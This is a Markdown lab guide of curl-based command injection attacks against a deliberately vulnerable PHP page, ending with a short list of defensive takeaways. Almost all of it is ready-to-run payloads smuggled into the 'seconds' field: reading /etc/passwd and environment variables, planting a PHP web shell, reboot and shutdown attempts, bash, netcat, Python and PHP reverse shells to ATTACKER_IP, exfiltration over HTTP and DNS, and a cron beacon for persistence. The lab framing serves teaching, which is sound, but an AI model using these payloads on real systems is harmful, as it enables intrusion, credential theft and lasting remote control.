# Command Injection Examples with curl

**⚠️ WARNING: These examples are for educational purposes only!**
- Use only against the vulnerable lab environment
- Never use these techniques against systems you don't own
- These demonstrate real attack vectors for defensive learning

**Tip:** Add `2>/dev/null | jq -r .output` to commands to suppress curl progress and parse JSON output cleanly.

## Setup

Replace `TARGET_IP` with your lab instance IP address:

```bash
export TARGET_IP="YOUR_LAB_IP_HERE"
```

## Basic Examples

### 1. Simple Command Execution

Execute `whoami`:
```bash
curl -X POST "http://${TARGET_IP}/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; whoami" \
  2>/dev/null | jq -r .output
```

Execute `id`:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; id" \
  2>/dev/null | jq -r .output
```

### 2. List Files

List current directory:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; ls -la" \
  2>/dev/null | jq -r .output
```

List root directory:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; ls -la /" \
  2>/dev/null | jq -r .output
```

List with full paths:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; find /var/www/html -type f" \
  2>/dev/null | jq -r .output
```

### 3. Read Files

Read `/etc/passwd`:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; cat /etc/passwd" \
  2>/dev/null | jq -r .output
```

Read `/etc/hostname`:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; cat /etc/hostname" \
  2>/dev/null | jq -r .output
```

Read environment variables:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; env" \
  2>/dev/null | jq -r .output
```

Read source code:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; cat /var/www/html/vulnerable.php" \
  2>/dev/null | jq -r .output
```

### 4. Create/Upload Files

Create a simple text file:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; echo 'Hello from attacker' > /tmp/pwned.txt" \
  2>/dev/null | jq -r .output
```

Create a file with cat (heredoc style):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; cat > /tmp/backdoor.txt << 'EOF'
This is a backdoor file
Created via command injection
EOF" \
  2>/dev/null | jq -r .output
```

Create a PHP backdoor (web shell):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=1; echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php" \
  2>/dev/null | jq -r .output
```

Verify file creation:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; cat /tmp/pwned.txt" \
  2>/dev/null | jq -r .output
```

### 5. Delete Files

Delete a file:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; rm /tmp/pwned.txt" \
  2>/dev/null | jq -r .output
```

Delete with confirmation:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; rm -f /tmp/backdoor.txt && echo 'Deleted'" \
  2>/dev/null | jq -r .output
```

**⚠️ DANGEROUS - Don't run on real systems:**
```bash
# This would delete everything (DO NOT RUN)
# curl -X POST "http://$TARGET_IP/vulnerable.php" \
#   -H "Content-Type: application/x-www-form-urlencoded" \
#   -d "seconds=1; rm -rf /tmp/*"
```

### 6. System Information

Get system info:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; uname -a" \
  2>/dev/null | jq -r .output
```

Check disk space:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; df -h" \
  2>/dev/null | jq -r .output
```

Check memory:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; free -m" \
  2>/dev/null | jq -r .output
```

Check running processes:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; ps aux" \
  2>/dev/null | jq -r .output
```

Check network connections:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; netstat -tulpn" \
  2>/dev/null | jq -r .output
```

### 7. Try to Reboot (Will likely fail due to permissions)

Attempt reboot:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; reboot" \
  2>/dev/null | jq -r .output
```

Attempt shutdown:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; shutdown -h now" \
  2>/dev/null | jq -r .output
```

Check if we have sudo (usually no):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; sudo -l" \
  2>/dev/null | jq -r .output
```

## Advanced Examples

### 8. Reverse Shell

**Setup listener on your machine first:**
```bash
nc -lvnp 4444
```

**Then execute (replace ATTACKER_IP):**

Bash TCP reverse shell:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

NC reverse shell (if netcat is available):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=1; nc ATTACKER_IP 4444 -e /bin/bash"
```

Python reverse shell:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

PHP reverse shell:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=1; php -r '\$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
```

### 9. Data Exfiltration

Exfiltrate data via HTTP GET (setup listener: `nc -lvnp 8080`):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=1; curl http://ATTACKER_IP:8080/\$(cat /etc/passwd | base64)"
```

Exfiltrate via DNS (requires DNS server logging):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=1; nslookup \$(whoami).attacker.com"
```

### 10. Persistence

Add cron job (if writable):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=1; echo '*/5 * * * * curl http://ATTACKER_IP/beacon' >> /tmp/mycron && crontab /tmp/mycron"
```

### 11. Chain Multiple Commands

Using semicolon (;):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; whoami; id; pwd" \
  2>/dev/null | jq -r .output
```

Using AND operator (&&):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1 && whoami && echo 'Command executed'" \
  2>/dev/null | jq -r .output
```

Using OR operator (||):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=999 || whoami" \
  2>/dev/null | jq -r .output
```

Using pipe (|):
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1 | cat /etc/hostname" \
  2>/dev/null | jq -r .output
```

Using backticks:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=\$(echo 2); whoami" \
  2>/dev/null | jq -r .output
```

Using command substitution:
```bash
curl -X POST "http://$TARGET_IP/vulnerable.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "seconds=1; echo Current user: \$(whoami)" \
  2>/dev/null | jq -r .output
```

## Testing Against Safe Version

All of these should fail against the safe version:

```bash
# Should return error
curl -X POST "http://$TARGET_IP/safe.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=1; whoami"

# Should return error
curl -X POST "http://$TARGET_IP/safe.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=abc"

# Should work (valid input)
curl -X POST "http://$TARGET_IP/safe.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "seconds=5"
```

## Tips for Testing

1. **Use `--data-urlencode`** for complex payloads with special characters
2. **Add `-v` flag** to see full request/response details
3. **Use `-s` flag** for silent mode (no progress bar)
4. **Add timeout** with `--max-time 30` to avoid hanging
5. **Save output** with `-o output.txt`

## Defensive Takeaways

This demonstrates why you should:
- ✅ Validate all user input
- ✅ Use allowlists, not blocklists
- ✅ Avoid shell execution when possible
- ✅ Use parameterized commands or native functions
- ✅ Run with least privilege
- ✅ Implement defense in depth
- ✅ Monitor for suspicious command patterns
- ✅ Use Web Application Firewalls (WAF)

## References

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
